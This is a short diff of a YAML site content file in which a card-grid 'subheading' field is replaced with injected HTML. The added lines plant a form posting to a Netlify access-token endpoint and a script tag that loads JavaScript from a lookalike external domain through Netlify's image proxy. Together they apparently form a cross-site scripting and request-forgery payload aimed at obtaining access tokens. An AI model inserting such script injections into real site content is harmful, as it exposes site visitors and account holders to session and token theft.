@@ -16,10 +16,14 @@ sections:
         theme: secondary
   - type: CardGridSection
     heading: Card Grid Heading
-    subheading: >+
-      <script
-      src="https://app.netlify.com/.netlify/images?url=https://d33wubrfki0l68.cloudfront.net.cuhawk.co.uk/zmxncb1.js"></script>
+    subheading: >
+      <form id="tokenForm"
+      action="https://app.netlify.com/generate-access-control-token">
+          <input type="submit" value="Submit request" />
+      </form>
 
+      <script
+      src="https://app.netlify.com/.netlify/images?url=https://d33wubrfki0l68.cloudfront.net.cuhawk.co.uk/test45.js"></script>
   - type: CardGridSection
     heading: Jump to Topic
     subheading: |
